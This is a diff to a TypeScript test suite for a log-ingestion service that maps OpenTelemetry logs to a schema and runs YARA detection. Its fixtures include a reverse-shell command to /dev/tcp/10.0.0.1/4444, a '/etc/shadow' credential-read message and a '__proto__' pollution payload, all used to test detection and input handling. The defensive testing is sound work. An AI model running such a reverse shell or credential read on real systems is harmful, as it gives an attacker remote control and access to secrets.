@@ -19,9 +19,26 @@ const canonicalRuleSource = readFileSync(
   "utf8",
 );
 
+const VALID_BASIN_FIELD_TYPES = new Set([
+  "bool",
+  "int32",
+  "int64",
+  "uint32",
+  "uint64",
+  "float32",
+  "float64",
+  "decimal128",
+  "string",
+  "timestamp",
+  "json",
+  "bytes",
+  "list",
+  "struct",
+]);
+
 interface BasinField {
   name: string;
-  type: "string" | "int32" | "int64" | "boolean" | "list";
+  type: "string" | "int32" | "int64" | "bool" | "list";
   required: boolean;
   items?: { type: string };
 }
@@ -41,6 +58,10 @@ function assertMatchesBasinSchema(record: TelemetryLogRecord): void {
 
   const rec = record as unknown as Record<string, unknown>;
   for (const field of basinSchema.fields) {
+    expect(
+      VALID_BASIN_FIELD_TYPES.has(field.type),
+      `field ${field.name} has invalid Basin schema type '${String(field.type)}'`,
+    ).toBe(true);
     const val = rec[field.name];
     if (field.required) {
       expect(val, `required field ${field.name} must not be null/undefined`).not.toBeNull();
@@ -53,7 +74,7 @@ function assertMatchesBasinSchema(record: TelemetryLogRecord): void {
       case "string":
         expect(typeof val, `${field.name} should be string`).toBe("string");
         break;
-      case "boolean":
+      case "bool":
         expect(typeof val, `${field.name} should be boolean`).toBe("boolean");
         break;
       case "int32":
@@ -440,6 +461,206 @@ rule SSHD_Brute_Force : auth {
       failEnv,
     );
     expect(failRes.status).toBe(502);
+
+    // Unsupported OTLP protobuf Content-Type -> 415
+    const pbRes = await handler.fetch(
+      new Request("https://ingest.example/v1/logs", {
+        method: "POST",
+        headers: {
+          authorization: "Bearer test-secret-token-12345",
+          "content-type": "application/x-protobuf",
+        },
+        body: new Uint8Array([0x0a, 0x00]),
+      }),
+      env,
+    );
+    expect(pbRes.status).toBe(415);
+  });
+
+  it("ignores prototype property keys in priority and attributes_json without leaking or polluting", async () => {
+    const { handler, env, sentBatches } = makeTestHarness();
+    const res = await handler.fetch(
+      new Request("https://ingest.example/v1/logs", {
+        method: "POST",
+        headers: {
+          authorization: "Bearer test-secret-token-12345",
+          "content-type": "application/json",
+        },
+        body: JSON.stringify([
+          {
+            host: "proto-host",
+            priority: "constructor",
+            message: "benign constructor priority",
+          },
+          {
+            host: "proto-host",
+            priority: "__proto__",
+            message: "benign __proto__ priority",
+          },
+          {
+            host: "proto-host",
+            priority: "toString",
+            message: "benign toString priority",
+            attributes_json: '{"__proto__":{"polluted":1},"extra":"val"}',
+          },
+        ]),
+      }),
+      env,
+    );
+
+    expect(res.status).toBe(202);
+    expect(await res.json()).toEqual({ accepted: 3, matched: 0 });
+    expect(({} as { polluted?: unknown }).polluted).toBeUndefined();
+
+    const batch = sentBatches[0]!;
+    expect(batch).toHaveLength(3);
+    for (const rec of batch) {
+      assertMatchesBasinSchema(rec);
+      expect(rec.priority).toBe(6);
+      expect(rec.severity).toBe("INFO");
+    }
+    expect(JSON.parse(batch[2]!.attributes_json!)).toMatchObject({ extra: "val" });
+  });
+
+  it("unpacks OTLP/HTTP JSON resourceLogs batches, detects YARA matches, and rejects empty OTLP batches", async () => {
+    const { handler, env, sentBatches } = makeTestHarness();
+    const binaryAlertB64 = Buffer.from(
+      new Uint8Array([0xff, 0xfe, ...Buffer.from("bash -i >& /dev/tcp/10.0.0.1/4444", "utf8")]),
+    ).toString("base64");
+
+    const otlpPayload = {
+      resourceLogs: [
+        {
+          resource: {
+            attributes: [
+              { key: "host.name", value: { stringValue: "otel-edge-01" } },
+              { key: "service.name", value: { stringValue: "unknown_service:otelcol" } },
+              { key: "host.id", value: { stringValue: "machine-xyz" } },
+              { key: "host.boot_id", value: { stringValue: "boot-xyz" } },
+              { key: "deployment.environment", value: { stringValue: "prod" } },
+            ],
+          },
+          scopeLogs: [
+            {
+              scope: { name: "journald-receiver" },
+              logRecords: [
+                {
+                  timeUnixNano: "1731643200123000000",
+                  observedTimeUnixNano: "1731643201000000000",
+                  severityNumber: 17,
+                  severityText: "Error",
+                  body: { stringValue: "cat /etc/shadow attempt" },
+                  traceId: "4bf92f3577b34da6a3ce929d0e0e4736",
+                  spanId: "00f067aa0ba902b7",
+                  attributes: [
+                    { key: "systemd.unit", value: { stringValue: "audit.service" } },
+                    { key: "process.pid", value: { intValue: "8812" } },
+                    { key: "user.id", value: { intValue: 0 } },
+                    { key: "custom.note", value: { stringValue: "shadow-check" } },
+                  ],
+                },
+                {
+                  timeUnixNano: "1731643202000000000",
+                  severityNumber: 21,
+                  body: { bytesValue: binaryAlertB64 },
+                  traceId: "00000000000000000000000000000000",
+                  spanId: "0000000000000000",
+                  attributes: [
+                    { key: "syslog.identifier", value: { stringValue: "sh" } },
+                  ],
+                },
+                {
+                  timeUnixNano: "0",
+                  body: {
+                    kvlistValue: {
+                      values: [
+                        { key: "MESSAGE", value: { stringValue: "GET /readyz 200 OK" } },
+                        { key: "PRIORITY", value: { stringValue: "5" } },
+                        { key: "_COMM", value: { stringValue: "healthcheck" } },
+                      ],
+                    },
+                  },
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    };
+
+    const res = await handler.fetch(
+      new Request("https://ingest.example/v1/logs", {
+        method: "POST",
+        headers: {
+          authorization: "Bearer test-secret-token-12345",
+          "content-type": "application/json",
+        },
+        body: JSON.stringify(otlpPayload),
+      }),
+      env,
+    );
+
+    expect(res.status).toBe(202);
+    expect(await res.json()).toEqual({ accepted: 3, matched: 2 });
+
+    const records = sentBatches[0]!;
+    expect(records).toHaveLength(3);
+    for (const rec of records) {
+      assertMatchesBasinSchema(rec);
+    }
+
+    expect(records[0]!.host).toBe("otel-edge-01");
+    expect(records[0]!.service_name).toBe("audit.service");
+    expect(records[0]!.priority).toBe(3);
+    expect(records[0]!.severity).toBe("ERR");
+    expect(records[0]!.pid).toBe(8812);
+    expect(records[0]!.uid).toBe(0);
+    expect(records[0]!.machine_id).toBe("machine-xyz");
+    expect(records[0]!.boot_id).toBe("boot-xyz");
+    expect(records[0]!.trace_id).toBe("4bf92f3577b34da6a3ce929d0e0e4736");
+    expect(records[0]!.span_id).toBe("00f067aa0ba902b7");
+    expect(records[0]!.event_time).toBe("2024-11-15T04:00:00.123Z");
+    expect(records[0]!.observed_at).toBe("2024-11-15T04:00:01.000Z");
+    expect(records[0]!.yara_matched).toBe(true);
+    expect(records[0]!.yara_rules).toContain("Linux_Credential_Access_Attempt");
+    expect(JSON.parse(records[0]!.attributes_json!)).toMatchObject({
+      "deployment.environment": "prod",
+      "custom.note": "shadow-check",
+      "otel.scope.name": "journald-receiver",
+    });
+
+    expect(records[1]!.service_name).toBe("sh");
+    expect(records[1]!.priority).toBe(2);
+    expect(records[1]!.trace_id).toBeNull();
+    expect(records[1]!.span_id).toBeNull();
+    expect(records[1]!.yara_matched).toBe(true);
+    expect(records[1]!.yara_rules).toContain("Linux_Reverse_Shell_Indicator");
+
+    expect(records[2]!.host).toBe("otel-edge-01");
+    expect(records[2]!.service_name).toBe("healthcheck");
+    expect(records[2]!.priority).toBe(5);
+    expect(records[2]!.severity).toBe("NOTICE");
+    expect(records[2]!.message).toBe("GET /readyz 200 OK");
+    expect(records[2]!.yara_matched).toBe(false);
+
+    // Empty OTLP resourceLogs / logRecords -> 400
+    for (const emptyOtlp of [
+      { resourceLogs: [] },
+      { resourceLogs: [{ scopeLogs: [{ logRecords: [] }] }] },
+    ]) {
+      const emptyRes = await handler.fetch(
+        new Request("https://ingest.example/v1/logs", {
+          method: "POST",
+          headers: {
+            authorization: "Bearer test-secret-token-12345",
+            "content-type": "application/json",
+          },
+          body: JSON.stringify(emptyOtlp),
+        }),
+        env,
+      );
+      expect(emptyRes.status).toBe(400);
+    }
   });
 
   it("maintains bounded WASM heap across 500 repeated scans including empty and oversized payloads", () => {
@@ -460,6 +681,14 @@ rule SSHD_Brute_Force : auth {
     oversized.fill(0x41);
 
     try {
+      // Warm up internal scratch buffers before recording baseline linear memory size.
+      expect(detector.scan(empty, symbols)).toEqual([]);
+      expect(detector.scan(benign, symbols)).toEqual([]);
+      expect(detector.scan(malicious, symbols)).toHaveLength(1);
+      expect(detector.scan(oversized, symbols)).toEqual([]);
+
+      const baselineHeap = detector.heapByteLength;
+
       for (let i = 0; i < 500; i++) {
         expect(detector.scan(empty, symbols)).toEqual([]);
         expect(detector.scan(benign, symbols)).toEqual([]);
@@ -468,6 +697,8 @@ rule SSHD_Brute_Force : auth {
         expect(hits[0]!.name).toBe("Linux_Reverse_Shell_Indicator");
         expect(detector.scan(oversized, symbols)).toEqual([]);
       }
+
+      expect(detector.heapByteLength).toBe(baselineHeap);
     } finally {
       detector.dispose();
     }
